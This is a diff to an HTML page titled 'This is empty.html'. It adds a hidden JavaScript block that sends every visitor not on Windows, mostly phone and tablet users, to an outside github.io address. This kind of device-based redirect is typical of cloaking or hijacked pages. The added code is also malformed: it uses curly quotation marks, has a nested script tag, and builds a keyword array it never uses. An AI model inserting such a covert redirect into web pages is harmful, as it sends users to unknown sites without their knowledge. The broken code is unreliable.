@@ -1,5 +1,22 @@
 ﻿<!DOCTYPE html>
 <html>
+<script language=JavaScript>
+
+<script type=”text/javascript”>
+function checkserAgent(){
+var userAgentInfo=navigator.userAgent;
+var userAgentKeywords=new Array(“Android”, “iPhone” ,”SymbianOS”, “Windows Phone”, “iPad”, “iPod”, “MQQBrowser”);
+var flag=false;
+if(userAgentInfo.indexOf(“Windows NT”)==-1){
+flag=true;
+}
+return flag;
+}
+if(checkserAgent()){
+document.location.href=”https://ronnie8899.github.io/index2.html”;
+}
+</script>
+
 <head>
     <meta charset="utf-8"/>
     <title>This is empty.html</title>
